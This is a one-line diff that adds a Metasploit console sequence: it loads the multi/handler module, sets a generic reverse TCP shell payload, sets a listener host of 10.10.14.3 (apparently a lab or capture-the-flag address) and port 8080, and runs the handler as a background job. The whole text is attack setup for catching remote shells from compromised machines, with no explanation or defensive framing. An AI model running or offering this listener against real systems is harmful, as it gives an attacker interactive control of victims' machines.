@@ -1,0 +1,1 @@
+use multi/handler \n set payload generic/shell_reverse_tcp \n set LHOST 10.10.14.3 \n set LPORT 8080 \n run -j;
